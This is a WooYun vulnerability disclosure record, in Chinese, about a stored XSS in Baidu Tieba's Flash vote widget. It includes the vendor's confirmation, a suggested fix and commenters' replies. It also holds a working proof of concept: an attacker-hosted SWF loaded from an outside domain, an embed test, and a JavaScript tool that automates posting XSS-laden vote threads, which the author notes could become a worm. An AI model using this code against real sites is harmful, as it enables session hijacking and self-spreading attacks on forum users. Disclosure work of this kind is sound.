{"id": 18712, "wybug_id": "wooyun-2012-08354", "wybug_title": "百度贴吧存储型XSS - Flash又中枪了～～", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2012-06-16 12:06", "wybug_open_date": "2012-07-31 12:07", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-31：\t细节向公众公开  简要描述： 由于是帖子正文的存储型Xss,自动触发，可蠕虫，危害你们比俺清楚。 详细说明：  发现流程如下：1. 平时有事没事的时候，就会去自己的gainover吧测试一下。2. 今天晚上又去了，一直还没用过投票功能咧，就进去看了下。3. 发现有一个图片投票的功能，于是就随便弄了3个图，发布了一下。4. 发布之后，发现这个投票，是Flash做的。\n\n5. 既然图片是在Flash里加载的，那么肯定是用的 Loader类来加载外部图片URL实现的了。6. 直觉告诉我，这里可能存在一处安全问题。7. 这里存在安全问题需要满足几个条件，A. 投票的flash允许执行脚本，即allowscriptaccess需为samedomain/未设置/always，但是投票的flash文件与百度贴吧不同域，因为allowscriptacess必须为always。 B. flash里未对外部加载的URL内容进行判断8. F12 打开调试工具，可以看到我们运气真好，allowscriptaccess是always，希望就在前方。 \n\n9. 接着我们再次去发表投票的位置，将其中一个图片地址改为 http://xsst.sinaapp.com/Xjs.swf#.gif, 提交的时候，提示如下：\n\n10. 但是，抓包不难看出，这种验证仅仅是客户端的验证。我们修改请求数据，很容易就成功绕过了。11. 用抓包工具，查看我们生成的投票。可以看见，确实调用了我们的flash文件。\nhttp://static.tieba.baidu.com/tb/flash/vote.swf?r=166486139965bce7156bc36762bb2c3edf&voteId=0e1e9a0f95d922fc978c0adf&tn=ajaxCanVote&stamp=1339767810003\n\n\n进一步用以下代码在本地进行模拟 （例如:http://localhost/tieba.htm）。\n<embed src=\"http://static.tieba.baidu.com/tb/flash/vote.swf?r=166486139965bce7156bc36762bb2c3edf&voteId=0e1e9a0f95d922fc978c0adf&tn=ajaxCanVote&stamp=1339767810003\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\"></embed>\n成功弹窗。12. 综上，我们在 7 里所说的2个条件，此处均满足，也就意味着，确实存在安全问题。--------------------   漏洞利用篇 -------------------------上面是分析过程，下面为了方便我们对此漏洞的利用，我们对投票过程加以分析。可以得到以下流程。1. 添加一个投票：POST http://tieba.baidu.com/vote/commit/add_vote?alt=json 2. 获取贴吧tbs: GET http://tieba.baidu.com/dc/common/tbs?t=0.70855382434092463. 发表一个投票贴: POST http://tieba.baidu.com/f/commit/vote/add4. 关联投票与投票贴： POST http://tieba.baidu.com/vote/commit/add_vote_relation?alt=json基于以上步骤，我拿js写了一个简单的发帖工具：\n<textarea id=\"t\" style=\"width:100%;height:150px\"></textarea>\t<input type=\"button\" value=\"Post a Xss vote\" onclick=\"ok()\" />\t<script type=\"text/javascript\">\t\tvar config={\t\t\t\"kw\":\"gainover\",\t\t\t\"id\":\"751341\",\t\t\t\"title\":\"Just test for fun\"\t\t};\t\t//添加一个投票\t\tfunction addVote (){\t\t\t$(\"t\").value+=\"添加投票中....\\n\";\t\t\tNet.post(\"http://tieba.baidu.com/vote/commit/add_vote?alt=json\",{\t\t\t\t\"product_name\":\"forum\",\t\t\t\t\"title\":config.title,\t\t\t\t\"expire_time\":\"2012-06-22 21:18:44\",\t\t\t\t\"item_type\":\"1\",\t\t\t\t\"max_select_num\":\"1\",\t\t\t\t\"perm\":\"0\",\t\t\t\t\"attr_key_1\":\"forum_name\",\t\t\t\t\"attr_value_1\":config.kw,\t\t\t\t\"attr_key_2\":\"forum_id\",\t\t\t\t\"attr_value_2\":config.id, //gainover吧\t\t\t\t\"item_title_1\":\"vote 1:\"+$R(6,\"ns\"),\t\t\t\t\"item_content_1\":\"http://xsst.sinaapp.com/Xjs.swf#1.gif\",\t\t\t\t\"item_title_2\":\"vote 2:\"+$R(6,\"ns\"),\t\t\t\t\"item_content_2\":\"http://imgsrc.baidu.com/forum/pic/item/b9d3efb1c21a60589a50274f.jpg\",\t\t\t\t\"item_title_3\":\"vote 3:\"+$R(6,\"ns\"),\t\t\t\t\"item_content_3\":\"http://imgsrc.baidu.com/forum/pic/item/b9d3efb1c21a60589a50274f.jpg\",\t\t\t\t\"ie\":\"utf-8\"\t\t\t},function(rs){\t\t\t\t$(\"t\").value+=\"添加投票成功\\n\";\t\t\t\tvar vid=rs.vote_id;\t\t\t\tvar sid=rs.sign_id;\t\t\t\tgetTBS(function(rs){\t\t\t\t\taddVotePost(rs.tbs,vid,sid);\t\t\t\t});\t\t\t},\"json\");\t\t}\t\t//获得tbs\t\tfunction getTBS (callback){\t\t\t$(\"t\").value+=\"获取tbs参数....\\n\";\t\t\tNet.get(\"http://tieba.baidu.com/dc/common/tbs?t=\"+Math.random(),function(rs){\t\t\t\t$(\"t\").value+=\"添加tbs参数成功\\n\";\t\t\t\tif(callback){\t\t\t\t\tcallback(rs);\t\t\t\t}\t\t\t},\"json\");\t\t}\t\t//添加一个投票贴\t\tfunction addVotePost (tbs,vid,sid){\t\t\t$(\"t\").value+=\"发表投票贴中....\\n\";\t\t\tNet.post(\"http://tieba.baidu.com/f/commit/vote/add\",{\t\t\t\t\"kw\":config.kw,\t\t\t\t\"title\":config.title,\t\t\t\t\"content\":\"\",\t\t\t\t\"tid\":\"0\",\t\t\t\t\"floor_num\":\"0\",\t\t\t\t\"anonymous\":\"\",\t\t\t\t\"rich_text\":\"\",\t\t\t\t\"pic_url\":\"\",\t\t\t\t\"sign_id\":\"\",\t\t\t\t\"vcode\":\"\",\t\t\t\t\"fid\":config.id,\t\t\t\t\"vid_md5\":vid+\",\"+sid,\t\t\t\t\"vcode_md5\":\"\",\t\t\t\t\"ie\":\"utf-8\",\t\t\t\t\"tbs\":tbs\t\t\t},function(rs){\t\t\t\tif(rs.no==0&&rs.error==\"\"){\t\t\t\t\t$(\"t\").value+=\"发表带Xss的投票贴成功\\n\";\t\t\t\t\taddVoteRelation(rs.data.tid,vid,sid);\t\t\t\t}else{\t\t\t\t\t$(\"t\").value+=\"addVotePost(\"+tbs+\",\"+vid+\",\"+sid+\") 出错\\n\";\t\t\t\t}\t\t\t},\"json\");\t\t}\t\t//将投票贴与投票关联\t\tfunction addVoteRelation (tid,vid,sid){\t//thread_id,vote_id,sign_id\t\t\tNet.post(\"http://tieba.baidu.com/vote/commit/add_vote_relation?alt=json\",{\t\t\t\t\"product_name\":\"forum\",\t\t\t\t\"id_1\":tid,\t\t\t\t\"id_2\":config.id,\t\t\t\t\"vote_id\":vid,\t\t\t\t\"sign_id\":sid,\t\t\t\t\"ie\":\"utf-8\",\t\t\t\t\"_\":\"\"\t\t\t},function(rs){\t\t\t\t$(\"t\").value+=\"Complete, it's OK!!!\";\t\t\t},\"json\");\t\t}\t\tfunction ok (){\t\t\t$(\"t\").value=\"\";\t\t\taddVote();\t\t}\t</script>\n当然以上过程，修改为自动化的话，就变蠕虫啦，这里我只是给出一个本地点击一下按钮，即可发布一篇带有Xss的投票贴的演示。 \n\n-----------------------------------------效果见漏洞证明！   漏洞证明：  见：http://tieba.baidu.com/p/1665378430  （为了安全考虑，帖子会自动加载我的no.js，但是no.js里的代码已经被我删掉，因而不会有弹窗。）下面是我截的弹窗图---------------------------\n\n---------------------------抓包加载图---------------------------\n\n---------------------------调试工具节点图---------------------------\n\n   修复方案：  我想，这个投票只是个投票请求，应该不需要FLASH与js的交互吧，因而将投票的flash的allowscriptaccess参数改为never是最简单的解决办法。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-06-19 14:43 厂商回复： 感谢提交，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-16 12:18 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我擦。追的好紧啊。    \n     2012-06-16 12:27 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  = = g牛昨晚你对我说的就是这个?    \n     2012-06-16 14:15 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  一楼压力好大啊、、    \n     2012-06-16 15:30 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  这两天的经验告诉我，心动不如行动    \n     2012-06-16 15:38 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  应该是快鱼吃慢鱼    \n     2012-06-16 16:14 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @水滴 哈～ 对的，快鱼吃鳗鱼    \n     2012-06-16 16:22 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  @gainover大概能猜出一个思路来，登号去试试，登着登着发现一处xss    \n     2012-06-16 16:56 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @水滴 ：）    \n     2012-06-16 17:20 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  @gainover 然后鸡肋了    \n     2012-06-16 17:25 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @水滴 = = 怎么鸡肋了？      \n     2012-06-17 08:17 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  啥时候出个手机版乌云    \n     2012-07-10 09:18 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞    \n     2012-07-31 13:32 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:424 漏洞数:52        | 招渗透/php/前端/ios&android安全，广州地...)\t\t \n  @gainover 给力哟，不知道跨站师使用的是什么插件抓包    \n     2012-07-31 14:12 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  !    \n     2012-07-31 14:23 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  那只猫，看上去，像拖了长长的一窜那个啥……    \n     2012-08-02 08:16 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  猫哥大神...膜拜    \n     2012-08-02 08:21 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  @also chrome    \n     2012-08-02 09:38 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:424 漏洞数:52        | 招渗透/php/前端/ios&android安全，广州地...)\t\t \n  @erevus ····其实你懂意思吗？！ chrome是浏览器，他自带的是firebug，我指的是他倒数第二张图！    \n     2012-08-02 20:30 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  目测是chrome的插件    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}